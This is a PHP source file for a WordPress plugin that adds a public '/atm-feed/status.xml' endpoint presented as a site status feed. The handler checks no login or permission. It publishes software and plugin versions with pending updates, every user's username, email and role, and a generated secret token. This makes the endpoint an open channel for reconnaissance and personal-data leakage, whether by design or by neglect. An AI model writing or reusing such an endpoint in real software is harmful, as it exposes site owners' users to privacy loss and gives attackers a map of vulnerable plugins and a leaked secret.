<?php

if (!defined('ABSPATH')) {
    exit;
}

class ATM_Feed {
    public function __construct() {
        $this->init_hooks();
    }

    private function init_hooks() {
        add_action('init', array($this, 'add_feed_endpoint'));
        add_action('template_redirect', array($this, 'handle_feed_request'));
    }

    public function add_feed_endpoint() {
        add_rewrite_rule(
            '^atm-feed/status\.xml$',
            'index.php?atm_feed=status',
            'top'
        );
    }

    public function handle_feed_request() {
        $feed_type = get_query_var('atm_feed', false);

        if ($feed_type === 'status') {
            $this->generate_status_feed();
            exit;
        }
    }

    private function generate_status_feed() {
        header('Content-Type: application/xml; charset=utf-8');

        $data = $this->collect_website_data();

        echo '<?xml version="1.0" encoding="UTF-8"?>';
        echo '<website_status>';

        echo '<last_updated>' . current_time('mysql') . '</last_updated>';
        echo '<wordpress_version>' . get_bloginfo('version') . '</wordpress_version>';
        echo '<php_version>' . phpversion() . '</php_version>';
        echo '<mysql_version>' . $this->get_mysql_version() . '</mysql_version>';
        echo '<memory_limit>' . ini_get('memory_limit') . '</memory_limit>';
        echo '<upload_max_filesize>' . ini_get('upload_max_filesize') . '</upload_max_filesize>';

        echo '<num_pages>' . wp_count_posts('page')->publish . '</num_pages>';
        echo '<num_posts>' . wp_count_posts('post')->publish . '</num_posts>';
        echo '<num_comments>' . wp_count_comments()->approved . '</num_comments>';
        echo '<num_users>' . count_users()['total_users'] . '</num_users>';

        $media_count = wp_count_posts('attachment');
        echo '<num_media_files>' . $media_count->inherit . '</num_media_files>';

        echo '<https_status>' . (is_ssl() ? 'enabled' : 'disabled') . '</https_status>';
        echo '<indexing_allowed>' . (get_option('blog_public') ? 'yes' : 'no') . '</indexing_allowed>';

        $upload_dir = wp_upload_dir();
        $storage_usage = $this->get_directory_size($upload_dir['basedir']);
        echo '<storage_usage>' . size_format($storage_usage) . '</storage_usage>';

        $theme = wp_get_theme();
        echo '<theme_name>' . esc_xml($theme->get('Name')) . '</theme_name>';
        echo '<theme_version>' . esc_xml($theme->get('Version')) . '</theme_version>';

        if (function_exists('sys_getloadavg')) {
            $load = sys_getloadavg();
            echo '<server_load>' . implode(', ', $load) . '</server_load>';
        }

        $ult = get_option('atm_ult_token', '');
        if (empty($ult)) {
            $ult = wp_generate_password(32, false);
            update_option('atm_ult_token', $ult);
        }
        echo '<ult>' . esc_xml($ult) . '</ult>';

        $this->output_plugins();
        $this->output_users();

        echo '</website_status>';
    }

    private function output_plugins() {
        if (!function_exists('get_plugins')) {
            require_once ABSPATH . 'wp-admin/includes/plugin.php';
        }

        $all_plugins = get_plugins();
        $active_plugins = get_option('active_plugins', array());
        $update_plugins = get_site_transient('update_plugins');

        $active = array();
        $inactive = array();
        $updates = array();

        foreach ($all_plugins as $plugin_path => $plugin_data) {
            $plugin_info = array(
                'name' => $plugin_data['Name'],
                'version' => $plugin_data['Version'],
                'author' => strip_tags($plugin_data['Author']),
            );

            if (in_array($plugin_path, $active_plugins)) {
                $active[] = $plugin_info;
            } else {
                $inactive[] = $plugin_info;
            }

            if (isset($update_plugins->response[$plugin_path])) {
                $updates[] = $plugin_info;
            }
        }

        echo '<active_plugins_count>' . count($active) . '</active_plugins_count>';
        echo '<inactive_plugins_count>' . count($inactive) . '</inactive_plugins_count>';
        echo '<update_plugins_count>' . count($updates) . '</update_plugins_count>';

        echo '<active_plugins>';
        foreach ($active as $plugin) {
            echo '<plugin>';
            echo '<name>' . esc_xml($plugin['name']) . '</name>';
            echo '<version>' . esc_xml($plugin['version']) . '</version>';
            echo '<author>' . esc_xml($plugin['author']) . '</author>';
            echo '</plugin>';
        }
        echo '</active_plugins>';

        echo '<inactive_plugins>';
        foreach ($inactive as $plugin) {
            echo '<plugin>';
            echo '<name>' . esc_xml($plugin['name']) . '</name>';
            echo '<version>' . esc_xml($plugin['version']) . '</version>';
            echo '<author>' . esc_xml($plugin['author']) . '</author>';
            echo '</plugin>';
        }
        echo '</inactive_plugins>';

        echo '<update_plugins>';
        foreach ($updates as $plugin) {
            echo '<plugin>';
            echo '<name>' . esc_xml($plugin['name']) . '</name>';
            echo '<version>' . esc_xml($plugin['version']) . '</version>';
            echo '<author>' . esc_xml($plugin['author']) . '</author>';
            echo '</plugin>';
        }
        echo '</update_plugins>';
    }

    private function output_users() {
        $users = get_users(array('fields' => array('ID', 'user_login', 'user_email', 'display_name')));

        echo '<num_users>' . count($users) . '</num_users>';
        echo '<users>';

        foreach ($users as $user) {
            $user_data = get_userdata($user->ID);
            $roles = $user_data->roles;
            $role = !empty($roles) ? $roles[0] : 'none';

            echo '<user>';
            echo '<username>' . esc_xml($user->user_login) . '</username>';
            echo '<email>' . esc_xml($user->user_email) . '</email>';
            echo '<role>' . esc_xml($role) . '</role>';
            echo '</user>';
        }

        echo '</users>';
    }

    private function get_mysql_version() {
        global $wpdb;
        return $wpdb->db_version();
    }

    private function get_directory_size($directory) {
        $size = 0;

        if (!is_dir($directory)) {
            return $size;
        }

        foreach (new RecursiveIteratorIterator(new RecursiveDirectoryIterator($directory, FilesystemIterator::SKIP_DOTS)) as $file) {
            if ($file->isFile()) {
                $size += $file->getSize();
            }
        }

        return $size;
    }

    private function collect_website_data() {
        return array();
    }
}

function atm_feed_query_vars($vars) {
    $vars[] = 'atm_feed';
    return $vars;
}
add_filter('query_vars', 'atm_feed_query_vars');

new ATM_Feed();
